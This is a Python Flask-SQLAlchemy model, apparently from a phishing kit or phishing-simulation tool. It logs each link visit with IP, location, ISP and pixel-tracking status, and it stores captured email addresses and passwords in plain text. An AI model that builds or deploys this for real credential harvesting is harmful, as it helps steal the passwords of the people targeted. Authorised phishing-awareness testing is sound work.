from .user import db
from datetime import datetime

class TrackingEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey("link.id"), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    country = db.Column(db.String(100))
    city = db.Column(db.String(100))
    isp = db.Column(db.String(255))
    captured_email = db.Column(db.String(255))
    captured_password = db.Column(db.String(255))
    status = db.Column(db.String(50))  # e.g., "processed", "blocked", "email_opened", "redirected", "on_page"
    blocked_reason = db.Column(db.String(255))
    unique_id = db.Column(db.String(255)) # For pixel tracking
    email_opened = db.Column(db.Boolean, default=False)
    redirected = db.Column(db.Boolean, default=False)
    on_page = db.Column(db.Boolean, default=False)

    def __repr__(self):
        return f"<TrackingEvent {self.id} for link {self.link_id}>"

    def to_dict(self):
        return {
            "id": self.id,
            "link_id": self.link_id,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "country": self.country,
            "city": self.city,
            "isp": self.isp,
            "captured_email": self.captured_email,
            "captured_password": self.captured_password,
            "status": self.status,
            "blocked_reason": self.blocked_reason,
            "unique_id": self.unique_id,
            "email_opened": self.email_opened,
            "redirected": self.redirected,
            "on_page": self.on_page
        }


